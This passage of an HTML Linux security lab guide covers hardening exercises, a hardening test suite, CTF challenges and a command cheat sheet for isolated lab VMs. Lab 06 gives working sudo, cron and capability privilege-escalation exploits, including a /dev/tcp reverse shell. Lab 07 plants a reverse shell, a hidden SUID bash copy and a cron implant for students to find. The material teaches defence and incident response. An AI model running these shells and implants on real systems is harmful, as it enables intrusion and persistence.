network security between lab nodes</div>\n      <div class=\"ex-body\">On lab-web: configure nftables to: allow SSH only from 192.168.100.0/24, allow port 8080 from lab-lb only, allow port 5432 to lab-db only, log and drop everything else. Verify from lab-attacker that port 8080 is not reachable.</div>\n      <div class=\"ex-task\">nft flush ruleset</div>\n      <div class=\"ex-task\">nft add table inet filter</div>\n      <div class=\"ex-task\">nft add chain inet filter input '{ type filter hook input priority 0; policy drop; }'</div>\n      <div class=\"ex-task\">nft add rule inet filter input ct state established,related accept</div>\n      <div class=\"ex-task\">nft add rule inet filter input ip saddr 192.168.100.0/24 tcp dport 22 accept</div>\n      <div class=\"ex-task\">nft add rule inet filter input ip saddr 192.168.100.10 tcp dport 8080 accept</div>\n      <div class=\"ex-verify\">✓ VERIFY: From lab-attacker: nmap -p 8080 192.168.100.20 shows port filtered. From lab-lb it shows open.</div>\n    </div>\n\n  </div>\n</div>\n\n<!-- PANEL 05 — PRACTICAL EXERCISES (Steps 7-12) -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🛡</span><span class=\"pt\">Practical Exercises — Steps 7–12 (Security to Enterprise)</span><span class=\"pn\">PANEL 05</span></div>\n  <div class=\"pb\">\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--r)\">\n      <div class=\"ex-num\" style=\"color:var(--r)\">LAB 06 — PRIVILEGE ESCALATION (Red Team)</div>\n      <div class=\"ex-title\" style=\"color:var(--r)\">Find and exploit 3 misconfiguration vulnerabilities</div>\n      <div class=\"ex-body\">Run the following misconfigurations on lab-web (as root), then switch to alice and try to escalate to root using each one. After each exploit, fix the misconfiguration and verify it's no longer exploitable.</div>\n      <div class=\"ex-task\"># Misconfiguration 1: Bad sudo rule\necho \"alice ALL=(ALL) NOPASSWD: /usr/bin/vim\" >> /etc/sudoers</div>\n      <div class=\"ex-task\"># Misconfiguration 2: World-writable cron\necho \"* * * * * root /tmp/exploit.sh\" > /etc/cron.d/test && chmod 777 /etc/cron.d/test</div>\n      <div class=\"ex-task\"># Misconfiguration 3: Python with cap_setuid\nsetcap cap_setuid=ep /usr/bin/python3.12</div>\n      <div class=\"ex-task\"># Now as alice — find and exploit each one\nsudo vim -c ':!/bin/bash'           # exploit 1\necho 'bash -i >& /dev/tcp/lab-attacker/4444 0>&1' >> /etc/cron.d/test  # exploit 2\npython3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"  # exploit 3</div>\n      <div class=\"ex-verify\">✓ VERIFY: After exploitation, fix each misconfiguration. Then re-run exploits and confirm they fail. Document root cause and fix for each.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--g)\">\n      <div class=\"ex-num\" style=\"color:var(--g)\">LAB 07 — INCIDENT RESPONSE SIMULATION</div>\n      <div class=\"ex-title\" style=\"color:var(--g)\">Detect, contain, and remediate a simulated breach</div>\n      <div class=\"ex-body\">From lab-attacker, run the breach simulation script. Then on lab-web, perform full IR: find the C2 connection, identify the malware binary, find persistence mechanism, collect forensic evidence, contain, and eradicate.</div>\n      <div class=\"ex-task\"># On lab-attacker: simulate attacker\nnc -lvnp 4444 &    # listen for reverse shell</div>\n      <div class=\"ex-task\"># Run breach on lab-web (as root to simulate post-exploitation)\nbash -c 'bash -i >& /dev/tcp/192.168.100.99/4444 0>&1 &'\ncp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden\necho \"* * * * * root /tmp/.hidden -p -c 'id'\" > /etc/cron.d/.update</div>\n      <div class=\"ex-task\"># IR: Find the breach on lab-web\nss -tunp | grep ESTAB | grep -v \"192.168.100.[12]\"\nls -la /proc/*/exe 2>/dev/null | grep deleted\nfind /tmp /var /etc -newer /etc/passwd -type f 2>/dev/null\nfind / -perm -4000 -newer /etc/passwd 2>/dev/null</div>\n      <div class=\"ex-verify\">✓ VERIFY: Document every IoC found. Kill C2 connection. Remove SUID binary. Remove cron implant. Write incident report.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--c)\">\n      <div class=\"ex-num\" style=\"color:var(--c)\">LAB 08 — PERFORMANCE ANALYSIS</div>\n      <div class=\"ex-title\" style=\"color:var(--c)\">Diagnose and fix 3 performance issues under load</div>\n      <div class=\"ex-body\">Install stress tools on lab-web. Simulate CPU overload, disk I/O saturation, and memory pressure. Use monitoring tools to identify, diagnose, and remediate each issue. Set cgroup limits to prevent recurrence.</div>\n      <div class=\"ex-task\">apt install -y stress-ng fio sysbench</div>\n      <div class=\"ex-task\"># CPU overload simulation\nstress-ng --cpu 8 --timeout 60s &\ntop -bn1 | head -5; vmstat 1 5; ps aux --sort=-%cpu | head -5</div>\n      <div class=\"ex-task\"># Disk I/O saturation\nfio --name=test --rw=write --bs=4k --size=1G --numjobs=4 --runtime=30 &\niostat -x 1 5; iotop -bn 3 | head -10</div>\n      <div class=\"ex-task\"># Memory pressure\nstress-ng --vm 2 --vm-bytes 80% --timeout 30s &\nfree -h; vmstat 1 5 | grep -E \"si|so\"</div>\n      <div class=\"ex-task\"># Fix: apply cgroup limits\nsystemctl set-property stress-ng.service CPUQuota=50% MemoryMax=512M 2>/dev/null || true</div>\n      <div class=\"ex-verify\">✓ VERIFY: For each issue: identify from metrics, name root cause tool, apply fix, show metrics returning to normal.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--y)\">\n      <div class=\"ex-num\" style=\"color:var(--y)\">LAB 09 — FULL NGINX + POSTGRESQL STACK</div>\n      <div class=\"ex-title\" style=\"color:var(--y)\">Deploy production web stack with TLS, DB, and monitoring</div>\n      <div class=\"ex-body\">Deploy nginx on lab-web proxying to a Flask app. Set up PostgreSQL on lab-db with a dedicated app user. Configure TLS with self-signed cert. Set up node_exporter on both nodes. Verify end-to-end: curl → nginx → app → postgresql → response.</div>\n      <div class=\"ex-task\"># lab-db: PostgreSQL setup\napt install -y postgresql-16\nsudo -u postgres psql -c \"CREATE DATABASE appdb; CREATE USER appuser WITH PASSWORD 'labpass'; GRANT ALL ON DATABASE appdb TO appuser;\"\nsed -i \"s/listen_addresses = 'localhost'/listen_addresses = '192.168.100.30'/\" /etc/postgresql/16/main/postgresql.conf\necho \"host appdb appuser 192.168.100.20/32 md5\" >> /etc/postgresql/16/main/pg_hba.conf\nsystemctl restart postgresql</div>\n      <div class=\"ex-task\"># lab-web: nginx TLS config\nopenssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/lab.key -out /etc/ssl/lab.crt -days 365 -nodes -subj \"/CN=lab-web\"\ncat > /etc/nginx/sites-enabled/lab << 'EOF'\nserver { listen 443 ssl; ssl_certificate /etc/ssl/lab.crt; ssl_certificate_key /etc/ssl/lab.key;\n  location / { proxy_pass http://127.0.0.1:8080; } }\nEOF\nnginx -t && systemctl reload nginx</div>\n      <div class=\"ex-task\"># Verify end-to-end\ncurl -k https://lab-web/health\npsql -h 192.168.100.30 -U appuser -d appdb -c \"SELECT version();\"</div>\n      <div class=\"ex-verify\">✓ VERIFY: curl -k https://lab-web returns 200. psql connects from lab-web to lab-db. Prometheus scrapes metrics from both.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--o)\">\n      <div class=\"ex-num\" style=\"color:var(--o)\">LAB 10 — BACKUP, RESTORE & DISASTER RECOVERY</div>\n      <div class=\"ex-title\" style=\"color:var(--o)\">Test your RPO/RTO — can you recover from disaster?</div>\n      <div class=\"ex-body\">Simulate database corruption on lab-db. Time your full recovery: pg_dump restore to a specific point. Then practice file system backup with borg. Finally, simulate complete VM failure and rebuild from scratch using your Ansible playbook.</div>\n      <div class=\"ex-task\"># Create backup BEFORE disaster\npg_dump -U postgres appdb > /backups/appdb_$(date +%Y%m%d).sql\nborg init --encryption=none /backups/borg-repo\nborg create /backups/borg-repo::lab-$(date +%Y%m%d) /etc /var/www /opt</div>\n      <div class=\"ex-task\"># Simulate disaster\nsudo -u postgres psql -c \"DROP DATABASE appdb;\"  # database gone!</div>\n      <div class=\"ex-task\"># Time your recovery (RTO measurement)\ntime sudo -u postgres psql -c \"CREATE DATABASE appdb;\"\ntime sudo -u postgres psql appdb < /backups/appdb_$(date +%Y%m%d).sql</div>\n      <div class=\"ex-task\"># Verify recovery\nsudo -u postgres psql -d appdb -c \"\\dt\"  # tables should be back</div>\n      <div class=\"ex-verify\">✓ VERIFY: Record your actual RTO. Was it under 5 minutes? What would RPO be if disaster happened 1 hour after last backup?</div>\n    </div>\n\n  </div>\n</div>\n\n<!-- PANEL 06 — AUTOMATED TEST SUITE -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🤖</span><span class=\"pt\">Automated Test Suite — Run on Any Lab Node</span><span class=\"pn\">PANEL 06</span></div>\n  <div class=\"pb\">\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">lab_test_suite.sh — automated security & configuration checks</span></div>\n      <div class=\"tb\">\n        <span class=\"oyn\">#!/bin/bash</span>\n        <span class=\"oyn\">## Linux Lab Automated Test Suite</span>\n        <span class=\"oyn\">## Usage: sudo bash lab_test_suite.sh</span>\n        <span class=\"out\">PASS=0; FAIL=0; WARN=0</span>\n        <span class=\"oyn\">check() { local desc=$1 cmd=$2 expected=$3</span>\n        <span class=\"oyn\">  result=$(eval \"$cmd\" 2>/dev/null)</span>\n        <span class=\"oyn\">  if echo \"$result\" | grep -q \"$expected\"; then</span>\n        <span class=\"ogn\">    echo \"  ✓ PASS: $desc\"; ((PASS++))</span>\n        <span class=\"oyn\">  else</span>\n        <span class=\"ored\">    echo \"  ✗ FAIL: $desc (got: $result)\"; ((FAIL++))</span>\n        <span class=\"oyn\">  fi; }</span>\n        <span class=\"oyn\">warn() { local desc=$1 cmd=$2 bad=$3</span>\n        <span class=\"oyn\">  result=$(eval \"$cmd\" 2>/dev/null)</span>\n        <span class=\"oyn\">  if echo \"$result\" | grep -q \"$bad\"; then</span>\n        <span class=\"oyn\">    echo \"  ⚠ WARN: $desc\"; ((WARN++)); fi; }</span>\n\n        <span class=\"sec\">──── IDENTITY CHECKS ────</span>\n        <span class=\"oyn\">echo \"=== IDENTITY & ACCESS ===\"</span>\n        <span class=\"oyn\">check \"Only root has UID 0\" \\</span>\n        <span class=\"oyn\">  \"awk -F: '\\$3==0{print \\$1}' /etc/passwd | tr '\\n' ','\" \\</span>\n        <span class=\"oyn\">  \"^root,$\"</span>\n        <span class=\"oyn\">check \"No accounts with empty passwords\" \\</span>\n        <span class=\"oyn\">  \"awk -F: '\\$2==\\\"\\\"{print \\$1}' /etc/shadow | wc -l\" \"^0$\"</span>\n        <span class=\"oyn\">warn \"NOPASSWD in sudoers\" \\</span>\n        <span class=\"oyn\">  \"grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null\" \"NOPASSWD\"</span>\n        <span class=\"oyn\">check \"No MD5 password hashes\" \\</span>\n        <span class=\"oyn\">  \"awk -F: '\\$2~/^\\\\\\$1\\\\\\$/{count++}END{print count+0}' /etc/shadow\" \"^0$\"</span>\n\n        <span class=\"sec\">──── SSH CHECKS ────</span>\n        <span class=\"oyn\">echo \"=== SSH HARDENING ===\"</span>\n        <span class=\"oyn\">check \"SSH PermitRootLogin disabled\" \\</span>\n        <span class=\"oyn\">  \"sshd -T | grep permitrootlogin\" \"no\"</span>\n        <span class=\"oyn\">check \"SSH PasswordAuthentication disabled\" \\</span>\n        <span class=\"oyn\">  \"sshd -T | grep passwordauthentication\" \"no\"</span>\n        <span class=\"oyn\">check \"SSH MaxAuthTries <= 3\" \\</span>\n        <span class=\"oyn\">  \"sshd -T | grep maxauthtries | awk '{print (\\$2<=3)?\\\"ok\\\":\\\"fail\\\"}'\" \"ok\"</span>\n\n        <span class=\"sec\">──── KERNEL & SYSCTL ────</span>\n        <span class=\"oyn\">echo \"=== KERNEL HARDENING ===\"</span>\n        <span class=\"oyn\">check \"ASLR enabled (=2)\" \\</span>\n        <span class=\"oyn\">  \"sysctl -n kernel.randomize_va_space\" \"2\"</span>\n        <span class=\"oyn\">check \"dmesg_restrict enabled\" \\</span>\n        <span class=\"oyn\">  \"sysctl -n kernel.dmesg_restrict\" \"1\"</span>\n        <span class=\"oyn\">check \"SYN cookies enabled\" \\</span>\n        <span class=\"oyn\">  \"sysctl -n net.ipv4.tcp_syncookies\" \"1\"</span>\n        <span class=\"oyn\">check \"rp_filter enabled\" \\</span>\n        <span class=\"oyn\">  \"sysctl -n net.ipv4.conf.all.rp_filter\" \"1\"</span>\n\n        <span class=\"sec\">──── FILESYSTEM ────</span>\n        <span class=\"oyn\">echo \"=== FILESYSTEM SECURITY ===\"</span>\n        <span class=\"oyn\">SUID_COUNT=$(find / -perm -4000 -not -path '/proc/*' -type f 2>/dev/null | wc -l)</span>\n        <span class=\"oyn\">[ $SUID_COUNT -lt 20 ] && echo \"  ✓ PASS: SUID count low ($SUID_COUNT)\" && ((PASS++)) \\</span>\n        <span class=\"oyn\">  || echo \"  ⚠ WARN: High SUID count: $SUID_COUNT\" && ((WARN++))</span>\n        <span class=\"oyn\">WWORLD=$(find / -perm -002 -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -type f 2>/dev/null | wc -l)</span>\n        <span class=\"oyn\">[ $WWORLD -eq 0 ] && echo \"  ✓ PASS: No world-writable files\" && ((PASS++)) \\</span>\n        <span class=\"oyn\">  || echo \"  ✗ FAIL: $WWORLD world-writable files!\" && ((FAIL++))</span>\n\n        <span class=\"sec\">──── SERVICES ────</span>\n        <span class=\"oyn\">echo \"=== RUNNING SERVICES ===\"</span>\n        <span class=\"oyn\">check \"auditd running\" \"systemctl is-active auditd\" \"active\"</span>\n        <span class=\"oyn\">check \"fail2ban running\" \"systemctl is-active fail2ban\" \"active\"</span>\n        <span class=\"oyn\">warn \"Exposed ports on 0.0.0.0 (check these!)\" \\</span>\n        <span class=\"oyn\">  \"ss -tlnp | grep '0\\.0\\.0\\.0' | grep -v ':22 '\" \"LISTEN\"</span>\n\n        <span class=\"sec\">──── SUMMARY ────</span>\n        <span class=\"oyn\">echo \"\"</span>\n        <span class=\"oyn\">echo \"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\"</span>\n        <span class=\"ogn\">echo \"  PASS: $PASS\"</span>\n        <span class=\"oyn\">echo \"  WARN: $WARN\"</span>\n        <span class=\"ored\">echo \"  FAIL: $FAIL\"</span>\n        <span class=\"oyn\">[ $FAIL -eq 0 ] && echo \"  STATUS: ✓ SECURE\" || echo \"  STATUS: ✗ NEEDS WORK\"</span>\n        <span class=\"oyn\">echo \"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\"</span>\n      </div>\n    </div>\n\n    <!-- Sample output -->\n    <div style=\"margin-top:12px;font-family:var(--sans);font-size:10px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">Sample Test Run Output</div>\n    <div style=\"background:var(--bg);border:1px solid var(--b2);padding:14px;font-family:var(--mono);font-size:12px;line-height:1.8\">\n      <div style=\"color:var(--c)\">root@lab-web:~# sudo bash lab_test_suite.sh</div>\n      <div style=\"color:var(--t3)\">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>\n      <div style=\"color:var(--y)\">=== IDENTITY & ACCESS ===</div>\n      <div class=\"test-row\"><div class=\"test-status ts-pass\">✓</div><div><div class=\"test-name\">Only root has UID 0</div><div class=\"test-cmd\">awk -F: '$3==0{print $1}' /etc/passwd → root</div></div></div>\n      <div class=\"test-row\"><div class=\"test-status ts-pass\">✓</div><div><div class=\"test-name\">No accounts with empty passwords</div></div></div>\n      <div class=\"test-row\"><div class=\"test-status ts-fail\">✗</div><div><div class=\"test-name\">NOPASSWD in sudoers — FOUND: alice ALL=(ALL) NOPASSWD:ALL</div><div class=\"test-cmd\">grep -r NOPASSWD /etc/sudoers → match found</div></div></div>\n      <div style=\"color:var(--y)\">=== SSH HARDENING ===</div>\n      <div class=\"test-row\"><div class=\"test-status ts-pass\">✓</div><div><div class=\"test-name\">SSH PermitRootLogin disabled</div></div></div>\n      <div class=\"test-row\"><div class=\"test-status ts-fail\">✗</div><div><div class=\"test-name\">SSH PasswordAuthentication — still enabled!</div><div class=\"test-cmd\">sshd -T | grep passwordauthentication → yes</div></div></div>\n      <div style=\"color:var(--y)\">=== KERNEL HARDENING ===</div>\n      <div class=\"test-row\"><div class=\"test-status ts-pass\">✓</div><div><div class=\"test-name\">ASLR enabled (=2)</div></div></div>\n      <div class=\"test-row\"><div class=\"test-status ts-pass\">✓</div><div><div class=\"test-name\">SYN cookies enabled</div></div></div>\n      <div style=\"color:var(--y)\">=== FILESYSTEM SECURITY ===</div>\n      <div class=\"test-row\"><div class=\"test-status ts-warn\">⚠</div><div><div class=\"test-name\">High SUID count: 24 — audit with find / -perm -4000</div></div></div>\n      <div class=\"test-row\"><div class=\"test-status ts-fail\">✗</div><div><div class=\"test-name\">2 world-writable files found! /etc/cron.d/test /tmp/exploit.sh</div></div></div>\n      <div style=\"color:var(--t3)\">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>\n      <div style=\"color:var(--g)\">  PASS: 7 &nbsp;&nbsp; <span style=\"color:var(--y)\">WARN: 1</span> &nbsp;&nbsp; <span style=\"color:var(--r)\">FAIL: 3</span></div>\n      <div style=\"color:var(--r)\">  STATUS: ✗ NEEDS WORK — fix the 3 failures above</div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 07 — CTF CHALLENGES -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🚩</span><span class=\"pt\">CTF-Style Challenges — Find the Flag</span><span class=\"pn\">PANEL 07</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>Each challenge plants a \"flag\" string (e.g. <code>FLAG{...}</code>) on the system. You must find it by exploiting the described vulnerability. Solve from a low-privilege user account. <strong style=\"color:var(--c)\">Set up each challenge as root, then switch to 'student' user and solve.</strong></span></div>\n\n    <div class=\"g2\">\n      <div class=\"ex-card\" style=\"border-left-color:var(--r);margin-bottom:0\">\n        <div class=\"ex-num\" style=\"color:var(--r)\">CHALLENGE 01 — SUID ESCAPE</div>\n        <div class=\"ex-title\" style=\"color:var(--r)\">Read /root/flag.txt as unprivileged user</div>\n        <div class=\"ex-body\">Setup (run as root): <code>echo \"FLAG{suid_master_$(hostname)}\" > /root/flag.txt && chmod 600 /root/flag.txt && cp /usr/bin/find /tmp/find_suid && chmod +s /tmp/find_suid</code></div>\n        <div class=\"ex-task\">Hint: GTFOBins. find has a known SUID escape.</div>\n        <div class=\"ex-verify\">✓ FLAG format: FLAG{suid_master_lab-web}</div>\n      </div>\n      <div class=\"ex-card\" style=\"border-left-color:var(--o);margin-bottom:0\">\n        <div class=\"ex-num\" style=\"color:var(--o)\">CHALLENGE 02 — CRON PRIVESC</div>\n        <div class=\"ex-title\" style=\"color:var(--o)\">Use a misconfigured cron job to escalate</div>\n        <div class=\"ex-body\">Setup: <code>echo \"* * * * * root /opt/checker.sh\" > /etc/cron.d/check && echo \"echo 'ok'\" > /opt/checker.sh && chmod 777 /opt/checker.sh</code></div>\n        <div class=\"ex-task\">Hint: You can write to /opt/checker.sh. What runs it? What could you make it do?</div>\n        <div class=\"ex-verify\">✓ Demonstrate you can read /root/flag2.txt via the cron vector</div>\n      </div>\n      <div class=\"ex-card\" style=\"border-left-color:var(--y);margin-bottom:0\">\n        <div class=\"ex-num\" style=\"color:var(--y)\">CHALLENGE 03 — LOG FORENSICS</div>\n        <div class=\"ex-title\" style=\"color:var(--y)\">Find attacker activity in the logs</div>\n        <div class=\"ex-body\">A simulated attacker has run commands on this system. Using only journalctl, auth.log, and auditd logs — find: (1) what time they logged in, (2) what commands they ran as root, (3) what file they created.</div>\n        <div class=\"ex-task\">journalctl --since \"1 hour ago\" | grep -E \"Accepted|sudo|COMMAND\"</div>\n        <div class=\"ex-task\">ausearch -k root_cmds -ts \"1 hour ago\" | grep -E \"execve|comm\"</div>\n        <div class=\"ex-verify\">✓ Write a 5-line incident summary: who, when, what commands, what was created, what should be done</div>\n      </div>\n      <div class=\"ex-card\" style=\"border-left-color:var(--c);margin-bottom:0\">\n        <div class=\"ex-num\" style=\"color:var(--c)\">CHALLENGE 04 — NETWORK DETECTIVE</div>\n        <div class=\"ex-title\" style=\"color:var(--c)\">Find the hidden C2 connection</div>\n        <div class=\"ex-body\">A process is secretly connecting to an external IP every 30 seconds. Find: which process, which PID, what destination IP and port, what command is it running, and how is it persisted (cron? systemd? bashrc?)</div>\n        <div class=\"ex-task\">ss -tunp | grep -v \"192.168.100\"</div>\n        <div class=\"ex-task\">lsof -p $(ss -tunp | grep ESTAB | grep -v \"192.168.100\" | awk '{print $NF}' | grep -oP \"pid=\\K[0-9]+\")</div>\n        <div class=\"ex-task\">cat /proc/PID/cmdline | tr '\\0' ' '; cat /proc/PID/environ | tr '\\0' '\\n' | grep -i ld</div>\n        <div class=\"ex-verify\">✓ Kill the process, remove persistence, and explain how it could have been prevented</div>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 08 — PROGRESSIVE BUILD LAB -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🏗</span><span class=\"pt\">Progressive Build — Full Enterprise Stack from Zero</span><span class=\"pn\">PANEL 08</span></div>\n  <div class=\"pb\">\n    <div style=\"display:flex;flex-direction:column\">\n      <div class=\"phase\" style=\"position:relative\"><div class=\"phase-line\"></div>\n        <div class=\"phase-dot\">1</div>\n        <div class=\"phase-body\">\n          <div class=\"phase-title\">Deploy Base Infrastructure (2h)</div>\n          <div class=\"phase-desc\">Provision all 5 VMs with Vagrant. Run base provisioning on each. Verify SSH from host to all nodes. Confirm /etc/hosts resolves all hostnames. Take snapshots.</div>\n          <div class=\"phase-cmd\">vagrant up && for h in lab-lb lab-web lab-db lab-monitor; do vagrant ssh $h -c \"hostname && ip addr show | grep 192.168\"; done</div>\n        </div>\n      </div>\n      <div class=\"phase\" style=\"position:relative\"><div class=\"phase-line\"></div>\n        <div class=\"phase-dot\">2</div>\n        <div class=\"phase-body\">\n          <div class=\"phase-title\">Deploy Application Stack (2h)</div>\n          <div class=\"phase-desc\">Install nginx on lab-web, PostgreSQL on lab-db, configure reverse proxy, set up database with app user, deploy Flask/Django app. Test end-to-end HTTP request → DB query → response.</div>\n          <div class=\"phase-cmd\">curl http://lab-lb/health && psql -h lab-db -U appuser -d appdb -c \"SELECT 1\"</div>\n        </div>\n      </div>\n      <div class=\"phase\" style=\"position:relative\"><div class=\"phase-line\"></div>\n        <div class=\"phase-dot\">3</div>\n        <div class=\"phase-body\">\n          <div class=\"phase-title\">Security Hardening Pass (2h)</div>\n          <div class=\"phase-desc\">Run lab_test_suite.sh on each node. Fix every FAIL. Configure SELinux/AppArmor. Set up AIDE baseline. Configure auditd. Run lynis on lab-web and get score above 75.</div>\n          <div class=\"phase-cmd\">sudo bash lab_test_suite.sh && lynis audit system | grep \"Hardening index\"</div>\n        </div>\n      </div>\n      <div class=\"phase\" style=\"position:relative\"><div class=\"phase-line\"></div>\n        <div class=\"phase-dot\">4</div>\n        <div class=\"phase-body\">\n          <div class=\"phase-title\">Deploy Monitoring Stack (2h)</div>\n          <div class=\"phase-desc\">Install node_exporter on all nodes, Prometheus on lab-monitor, Grafana on lab-monitor. Create dashboard for CPU, memory, disk, nginx RPS. Set up alerts for high CPU and service down.</div>\n          <div class=\"phase-cmd\">curl http://lab-monitor:9090/api/v1/targets | python3 -m json.tool | grep health</div>\n        </div>\n      </div>\n      <div class=\"phase\" style=\"position:relative\"><div class=\"phase-line\"></div>\n        <div class=\"phase-dot\">5</div>\n        <div class=\"phase-body\">\n          <div class=\"phase-title\">Red Team Attack & Blue Team Detect (2h)</div>\n          <div class=\"phase-desc\">From lab-attacker: run nmap scan, try SSH brute force, attempt web exploits. From lab-web: watch fail2ban ban the attacker, see auditd capture reconnaissance, verify firewall drops are logged.</div>\n          <div class=\"phase-cmd\">tail -f /var/log/auth.log | grep lab-attacker  # watch from lab-web</div>\n        </div>\n      </div>\n      <div class=\"phase\">\n        <div class=\"phase-dot\">6</div>\n        <div class=\"phase-body\">\n          <div class=\"phase-title\">Backup & Disaster Recovery Test (2h)</div>\n          <div class=\"phase-desc\">Take full borg backup of lab-web config. pg_dump lab-db. Destroy lab-web VM entirely. Rebuild from scratch using Ansible playbook + borg restore. Measure actual RTO.</div>\n          <div class=\"phase-cmd\">time (vagrant destroy lab-web -f && vagrant up lab-web && ansible-playbook -i lab-web, rebuild.yml)</div>\n        </div>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 09 — QUICK REFERENCE -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">📋</span><span class=\"pt\">Lab Quick Reference — Essential Commands per Step</span><span class=\"pn\">PANEL 09</span></div>\n  <div class=\"pb\">\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">copy-paste cheat sheet — one-liners per topic</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── SYSTEM EXPLORATION (Step 1-2) ────</span>\n        <span class=\"ogn\">uname -a; cat /etc/os-release; lscpu | grep -E \"Arch|CPU|Model\"; lsmod | head; pstree -p | head -20</span>\n        <span class=\"sec\">──── FILESYSTEM AUDIT (Step 3) ────</span>\n        <span class=\"ogn\">find / -perm -4000 2>/dev/null; find / -perm -002 -not -path '/proc/*' 2>/dev/null | head; df -ih; stat /etc/passwd</span>\n        <span class=\"sec\">──── IAM AUDIT (Step 4) ────</span>\n        <span class=\"ogn\">awk -F: '$3==0' /etc/passwd; awk -F: '$2==\"\"' /etc/shadow; grep -r NOPASSWD /etc/sudoers*; for g in sudo docker disk shadow; do getent group $g; done</span>\n        <span class=\"sec\">──── PROCESS & SERVICE (Step 5) ────</span>\n        <span class=\"ogn\">ps aux | awk '$8~/Z/'; systemctl list-units --state=failed; systemd-analyze blame | head; crontab -l; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -v \"^#\"; done</span>\n        <span class=\"sec\">──── NETWORKING (Step 6) ────</span>\n        <span class=\"ogn\">ss -tlnp; ip route show; ip neigh; nft list ruleset 2>/dev/null; ss -tnp state established | grep -v \"192.168.100\"</span>\n        <span class=\"sec\">──── SECURITY (Step 7) ────</span>\n        <span class=\"ogn\">lynis audit system --quick 2>&1 | grep -E \"Warning|Suggestion\"; aide --check 2>&1; dpkg --verify 2>/dev/null | head; ls -la /proc/*/exe 2>/dev/null | grep deleted</span>\n        <span class=\"sec\">──── BOOT (Step 8) ────</span>\n        <span class=\"ogn\">cat /proc/cmdline; systemd-analyze time; systemd-analyze blame | head; efibootmgr -v 2>/dev/null; mokutil --sb-state 2>/dev/null</span>\n        <span class=\"sec\">──── PACKAGES (Step 9) ────</span>\n        <span class=\"ogn\">apt list --upgradable 2>/dev/null | grep security; dpkg --verify 2>/dev/null; grep -r \"trusted=yes\" /etc/apt/ 2>/dev/null; apt-mark showhold</span>\n        <span class=\"sec\">──── MONITORING (Step 10) ────</span>\n        <span class=\"ogn\">journalctl -p err -b --no-pager | head -20; vmstat 1 3; iostat -x 1 3; lsof | grep deleted; ss -tn state time-wait | wc -l</span>\n        <span class=\"sec\">──── FORENSICS (Steps 7+10) ────</span>\n        <span class=\"ogn\">last -20; lastb | head -10; ausearch -k identity -ts today 2>/dev/null; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep LD_PRELOAD; find / -newer /etc/passwd -not -path '/proc/*' -type f 2>/dev/null | head -20</span>\n        <span class=\"sec\">──── FULL HEALTH CHECK (30-second system snapshot) ────</span>\n        <span class=\"ogn\">echo \"=USERS=\" && awk -F: '$3==0' /etc/passwd</span>\n        <span class=\"ogn\">echo \"=SUID=\" && find / -perm -4000 -not -path '/proc/*' 2>/dev/null | wc -l</span>\n        <span class=\"ogn\">echo \"=PORTS=\" && ss -tlnp | grep \"0.0.0.0\"</span>\n        <span class=\"ogn\">echo \"=LOAD=\" && uptime</span>\n        <span class=\"ogn\">echo \"=DISK=\" && df -h | awk '$5+0 > 80 {print \"HIGH:\", $0}'</span>\n        <span class=\"ogn\">echo \"=FAILS=\" && journalctl -p err -b --no-pager -n 5</span>\n        <span class=\"ogn\">echo \"=CRONS=\" && for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -v \"^#\" | grep -v \"^$\" && echo \"^^$u\"; done</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 10 — COMPLETION -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🏆</span><span class=\"pt\">Lab Completion Criteria — Pass / Fail Standards</span><span class=\"pn\">PANEL 10</span></div>\n  <div class=\"pb\">\n    <div class=\"g3\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">Core Competency (Must Pass)</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.9\">\n          <span class=\"hl\">✓</span> lab_test_suite.sh: 0 FAILs on lab-web<br>\n          <span class=\"hl\">✓</span> Lynis score ≥ 75 on lab-web<br>\n          <span class=\"hl\">✓</span> curl https://lab-lb/health returns 200<br>\n          <span class=\"hl\">✓</span> psql connects lab-web → lab-db<br>\n          <span 